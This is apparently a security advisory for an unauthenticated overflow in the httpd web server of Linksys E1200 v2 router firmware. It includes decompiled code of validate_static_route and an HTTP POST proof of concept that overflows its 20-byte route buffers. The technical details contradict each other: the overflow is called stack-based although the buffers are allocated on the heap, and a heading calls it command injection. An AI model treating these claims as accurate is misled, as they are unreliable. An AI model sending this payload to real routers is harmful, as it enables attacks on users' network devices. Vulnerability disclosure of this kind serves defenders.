# Buffer Overflow Vulnerability in `route_ipaddr`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Linksys E1200 v2 Router                                      |
| Firmware Version     | **E1200_v2.0.11.001_us.tar.gz**                              |
| Vulnerability Type   | **Stack-Based Buffer Overflow**                              |
| Vulnerable Component | `httpd` (function `validate_static_route`, buffers `v6`, `v10`, `v14`) |
| Prerequisites        | No authentication required; remote exploitation possible via CGI parameters (`route_ipaddr_0~3`, `route_netmask_0~3`, `route_gateway_0~3`) |

2. Exploitation Path

```c
void __fastcall validate_static_route(int a1, int a2, _DWORD *a3)
{
  ...
  v5 = malloc(0x14u);
  v6 = v5;
  if ( v5 )
  {
    *v5 = 0;
    for ( i = 0; i != 4; ++i )
    {
      snprintf(v85, 0x1Eu, "%s_%d", "route_ipaddr", i);
      v8 = (const char *)get_cgi((int)v85);
      if ( !v8 )
      {
        free(v6);
        return;
      }
      strcat(v6, v8);
      ...
    v9 = (char *)malloc(0x14u);
    v10 = v9;
    ...
    for ( j = 0; j != 4; ++j )
    {
      snprintf(v85, 0x1Eu, "%s_%d", "route_netmask", j);
      v12 = (const char *)get_cgi((int)v85);
      if ( !v12 )
        goto LABEL_43;
      strcat(v10, v12);
      ...
    v13 = (char *)malloc(0x14u);
    v14 = v13;
    ...
      for ( k = 0; k != 4; ++k )
      {
        snprintf(v85, 0x1Eu, "%s_%d", "route_gateway", k);
        v16 = (const char *)get_cgi((int)v85);
        if ( !v16 )
          goto LABEL_44;
        strcat(v14, v16);
        ...
}
```

3. **Vulnerable Binaries:** `httpd`.
4. 0-Day Command Injection Exploitation Path:
   - In the `httpd` file, at line 12, `v8 = (const char *)get_cgi((int)v85)` receives data via `get_cgi` without any length restriction. A loop of 4 iterations performs string concatenation at line 18 with `strcat(v6, v8)`, where the buffer `v6` is only 20 bytes in size. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
   - In the `httpd` file, at line 26, `v12 = (const char *)get_cgi((int)v85)` receives data via `get_cgi` without any length restriction. A loop of 4 iterations performs string concatenation at line 29 with `strcat(v10, v12)`, where the buffer `v10` is only 20 bytes in size. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
   - In the `httpd` file, at line 37, `v16 = (const char *)get_cgi((int)v85)` receives data via `get_cgi` without any length restriction. A loop of 4 iterations performs string concatenation at line 40 with `strcat(v14, v16)`, where the buffer `v14` is only 20 bytes in size. An attacker can send specially crafted CGI parameters, resulting in a buffer overflow vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/validate_static_route HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

route_ipaddr_0=AAAAAAAAAAAAAAAAAAAAA&route_ipaddr_1=BBBBBBBBBBBBBBBBBBB&route_ipaddr_2=CCCCCCCCCCCCCCCCCCC&route_ipaddr_3=DDDDDDDDDDDDDDDDDDD&
route_netmask_0=EEEEEEEEEEEEEEEEEEE&route_netmask_1=FFFFFFFFFFFFFFFFFFF&route_netmask_2=GGGGGGGGGGGGGGGGGGG&route_netmask_3=HHHHHHHHHHHHHHHHHHH&
route_gateway_0=IIIIIIIIIIIIIIIIIII&route_gateway_1=JJJJJJJJJJJJJJJJJJJ&route_gateway_2=KKKKKKKKKKKKKKKKKKK&route_gateway_3=LLLLLLLLLLLLLLLLLLL
```